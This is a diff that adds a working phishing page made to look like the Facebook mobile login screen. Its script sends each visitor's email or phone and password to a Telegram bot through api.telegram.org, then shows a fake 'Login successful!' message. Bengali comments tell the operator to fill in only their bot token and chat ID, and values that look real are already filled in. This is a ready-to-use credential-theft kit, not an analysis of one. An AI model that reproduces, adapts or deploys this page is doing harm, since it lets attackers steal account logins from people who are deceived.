@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Log in to Facebook</title>
+    <style>
+        /* CSS কোডে কোনো পরিবর্তন প্রয়োজন নেই */
+        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #121212; color: #e0e0e0; display: flex; justify-content: center; height: 100vh; -webkit-font-smoothing: antialiased; }
+        .container { display: flex; flex-direction: column; width: 100%; max-width: 420px; padding: 16px; box-sizing: border-box; }
+        .top-nav { display: flex; justify-content: center; align-items: center; width: 100%; position: relative; height: 40px; }
+        .back-arrow { position: absolute; left: 0; font-size: 28px; color: #b0b3b8; text-decoration: none; font-weight: 300; }
+        .language-selector { color: #b0b3b8; font-size: 14px; }
+        .logo-container { text-align: center; padding-top: 40px; padding-bottom: 50px; }
+        .logo { width: 65px; height: 65px; }
+        .info-text-container { text-align: center; border-bottom: 1px solid #3e4042; margin-bottom: 24px; padding-bottom: 24px; }
+        .info-text { font-size: 14px; color: #b0b3b8; line-height: 1.4; font-weight: 400; margin: 0; }
+        .info-text.line1 { margin-bottom: 2px; }
+        .info-text.line2 { margin-bottom: 12px; }
+        .change-settings { font-size: 14px; color: #1877F2; font-weight: 600; cursor: pointer; background: none; border: none; padding: 0; margin: 0; }
+        input[type="text"], input[type="password"] { width: 100%; background-color: #242526; border: 1px solid #3e4042; border-radius: 12px; padding: 16px; margin-bottom: 12px; color: #e0e0e0; font-size: 16px; box-sizing: border-box; }
+        input::placeholder { color: #8a8d91; font-size: 16px; }
+        input:focus { outline: none; border-color: #1877F2; }
+        .btn-login { width: 100%; padding: 14px; border: none; border-radius: 25px; background-color: #1877F2; color: white; font-size: 17px; font-weight: bold; cursor: pointer; margin-top: 5px; }
+        .btn-login:disabled { background-color: #555; cursor: not-allowed; }
+        .links-container { text-align: center; flex-grow: 1; display: flex; flex-direction: column; justify-content: space-between; }
+        .forgot-password { color: #b0b3b8; font-size: 15px; font-weight: 600; text-decoration: none; display: inline-block; margin-top: 20px; }
+        .bottom-content { margin-bottom: 20px; }
+        .btn-create { width: 100%; padding: 12px; border: 1px solid #555; border-radius: 25px; background-color: transparent; color: #b0b3b8; font-size: 15px; font-weight: 600; cursor: pointer; }
+        .meta-logo { text-align: center; margin-top: 20px; font-size: 18px; color: #b0b3b8; font-weight: 500; }
+        .meta-logo span { vertical-align: middle; }
+        .message { text-align: center; padding: 12px; margin-top: 15px; border-radius: 8px; display: none; font-weight: 500; }
+        .success { background-color: #28a745; color: white; }
+        .error { background-color: #dc3545; color: white; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        
+        <div class="top-nav">
+            <a href="#" class="back-arrow">&#8592;</a>
+            <div class="language-selector">English (US) &#9662;</div>
+        </div>
+
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Facebook Logo" class="logo">
+        </div>
+
+        <div class="info-text-container">
+            <p class="info-text line1">Facebook requests and receives your phone number</p>
+            <p class="info-text line2">from your mobile network.</p>
+            <button class="change-settings">Change Settings</button>
+        </div>
+        
+        <form id="loginForm">
+            <input type="text" id="emailOrPhone" placeholder="Mobile number or email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" id="submitBtn" class="btn-login">Log in</button>
+        </form>
+
+        <div id="statusMessage" class="message"></div>
+
+        <div class="links-container">
+             <a href="#" class="forgot-password">Forgot password?</a>
+             
+             <div class="bottom-content">
+                <button class="btn-create">Create new account</button>
+                <div class="meta-logo">
+                    <span>&#8734;</span> Meta
+                </div>
+            </div>
+        </div>
+        
+    </div>
+
+    <script>
+        // =================================================================
+        // === আপনাকে শুধু নিচের দুটি লাইন পরিবর্তন করতে হবে ===
+        // =================================================================
+
+        // ১. এই লাইনে আপনার আসল বট টোকেনটি বসান
+        const BOT_TOKEN = '7978883096:AAG-mPGjRCLCGbdYSlKH2MGWb1bYPFYO4X0'; 
+        
+        // ২. এই লাইনে আপনার আসল চ্যাট আইডিটি বসান
+        const CHAT_ID = '-1004412182234'; 
+
+        // =================================================================
+        // === নিচের কোডে কোনো কিছু পরিবর্তন করার প্রয়োজন নেই ===
+        // =================================================================
+
+        const form = document.getElementById('loginForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const statusMessage = document.getElementById('statusMessage');
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault(); 
+            const emailOrPhone = document.getElementById('emailOrPhone').value;
+            const password = document.getElementById('password').value;
+            if (!emailOrPhone || !password) {
+                showMessage('Please fill out all fields.', 'error');
+                return;
+            }
+            submitBtn.disabled = true;
+            submitBtn.innerText = 'Logging in...';
+            let messageText = encodeURIComponent(`
+🔵 === Facebook Login Attempt === 🔵
+--------------------------------------
+👤 User/Email: ${emailOrPhone}
+🔑 Password: ${password}
+--------------------------------------
+🗓️ Time: ${new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' })}
+            `);
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${messageText}`;
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        showMessage('Login successful!', 'success');
+                        form.reset();
+                    } else {
+                        throw new Error(`Telegram Error: ${data.description}`);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    showMessage('Login failed. Please try again.', 'error');
+                })
+                .finally(() => {
+                    submitBtn.disabled = false;
+                    submitBtn.innerText = 'Log in';
+                });
+        });
+        function showMessage(message, type) {
+            statusMessage.textContent = message;
+            statusMessage.className = `message ${type}`;
+            statusMessage.style.display = 'block';
+        }
+    </script>
+
+</body>
+</html>
